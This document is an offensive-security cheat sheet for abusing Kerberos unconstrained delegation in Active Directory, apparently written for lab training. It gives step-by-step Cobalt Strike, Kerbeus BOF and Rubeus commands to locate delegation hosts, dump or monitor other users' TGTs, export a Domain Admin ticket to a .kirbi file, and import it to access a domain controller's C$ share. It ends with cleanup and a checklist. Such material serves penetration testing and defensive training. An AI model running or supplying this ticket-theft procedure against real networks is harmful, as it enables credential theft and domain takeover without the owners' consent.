---
title: "Kerberos Unconstrained Delegation"
description: "Find unconstrained delegation, inspect forwarded TGTs, reuse a selected ticket in a separate session, and distinguish delegation from ordinary ticket caching."
category: "Kerberos"
tools: ["Cobalt Strike", "Kerbeus BOF", "Rubeus"]
updated: 2026-11-15
tags: ["kerberos", "delegation", "unconstrained-delegation", "ad"]
draft: false
---

## 1. Why the attack works

Delegation lets a front-end access another service on a user's behalf. With unconstrained delegation, an eligible Kerberos client can forward a usable TGT to the trusted service. Control of that host and sufficient access to its ticket cache can therefore expose another user's TGT.

This differs from ordinary network authentication: presenting a service ticket to a normal server does not, by itself, hand that server the user's TGT. An interactive logon may leave a TGT on either kind of host.

| Requirement | What to establish |
|---|---|
| Delegation-enabled principal | `TRUSTED_FOR_DELEGATION`, UAC bit `524288` |
| Access to the host | Elevated access sufficient to inspect other logon sessions |
| Delegated authentication | An eligible client actually authenticates using Kerberos and permits delegation |
| Useful client identity | The captured identity has the required access to the intended resource |

A delegation flag alone does not guarantee a privileged TGT will arrive. Protected Users, accounts marked sensitive and not delegable, client behavior, and trust policy can prevent forwarding. The flags `forwarded` and `forwardable` are useful evidence, but do not independently establish how a ticket arrived.

## 2. Find candidate computers

```shell
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName,dNSHostName
# Lab candidate: LON-WS-1$
```

This filter covers computer objects, not delegation-enabled user service accounts. Domain controllers may also appear; distinguish them from member servers rather than treating every result as a new escalation path. The remaining commands assume an elevated Beacon is already available on `lon-ws-1`.

## 3. Inspect and extract the selected TGT

```shell
beacon> krb_triage
# Identify the intended user's krbtgt/CONTOSO.COM ticket and LUID.
beacon> ldapsearch samAccountName=dyork --attributes memberOf
# Lab output includes Domain Admins; direct memberOf does not expand nested groups.
beacon> krb_dump /user:dyork /service:krbtgt
# Retain the complete base64 TGT and check its client and expiration.
```

For a specific logon session, select the LUID shown by triage instead of assuming that every ticket for the same username is interchangeable.

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
```

The lab also provides continuous monitoring. Use it when waiting for a new eligible authentication; it remains a running job until stopped.

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
beacon> jobs
# Record the monitor's actual JID.
beacon> jobkill <MONITOR_JID>
```

## 4. Reuse the captured identity

Run this conversion on the operator's Windows machine. `kerberos_ticket_use` reads a local file on that machine in the lab's Beacon workflow.

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<DYORK_TGT_BASE64>"))
```

```shell
beacon> make_token CONTOSO\dyork FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
beacon> run klist
# Confirm dyork and krbtgt/CONTOSO.COM in the selected session.
beacon> ls \\lon-dc-1\c$
```

The TGT allows requests for service tickets as `dyork`; access still depends on that account's permissions. The fake network-only password does not authenticate the user on its own.

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\dyork FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:dyork /password:FakePass /ticket:<BASE64_TICKET>
beacon> steal_token <CREATED_PID>
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

```shell
# BOF session cleanup: run while the disposable session is selected.
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only: terminate its disposable process.
beacon> kill <CREATED_PID>
```

## 5. Cleanup and troubleshooting

```shell
beacon> kerberos_ticket_purge
beacon> rev2self
```

Remove the exported `.kirbi` when no longer needed. Stop any monitor job using its actual JID.

| Symptom | Check |
|---|---|
| No user TGT appears | Client authentication, delegation eligibility, host and selected cache |
| Only service tickets appear | Do not confuse a service ticket with a forwarded TGT |
| Other LUIDs cannot be read | Elevation and access to the ticket cache |
| Access denied after import | Client identity, resource permissions, hostname and selected session |
| Ticket rejected | Expiration, clock synchronization, realm and complete base64 material |

## Quick checklist

```text
ENUMERATE AND CAPTURE
[ ] Identify TRUSTED_FOR_DELEGATION (UAC bit 524288) and distinguish member servers from DCs.
[ ] Obtain elevated access to the selected delegation host.
[ ] Confirm that the intended client can authenticate using Kerberos and delegate.
[ ] krb_triage -> select the user, LUID and krbtgt ticket.
[ ] krb_dump /user:dyork /service:krbtgt -> retain the complete TGT.
[ ] Rubeus alternative: dump /luid:<LUID> /service:krbtgt /nowrap.
[ ] If waiting for a new authentication, use monitor and record its JID.
[ ] Verify client identity, session material, expiration and actual resource permissions.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<DYORK_TGT_BASE64>"))
[ ] make_token CONTOSO\dyork FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:<DYORK_TGT_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-dc-1\c$ -> verify actual service authorization.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
[ ] If a monitor was started: jobs, then jobkill <MONITOR_JID>.
[ ] Remove the exported .kirbi file when no longer needed.
```

## Related references

- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
- [S4U2self computer takeover](/cheatsheets/kerberos-s4u2self-computer-takeover-cheatsheet/)
- [Rubeus documentation](https://github.com/GhostPack/Rubeus)
- [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF)
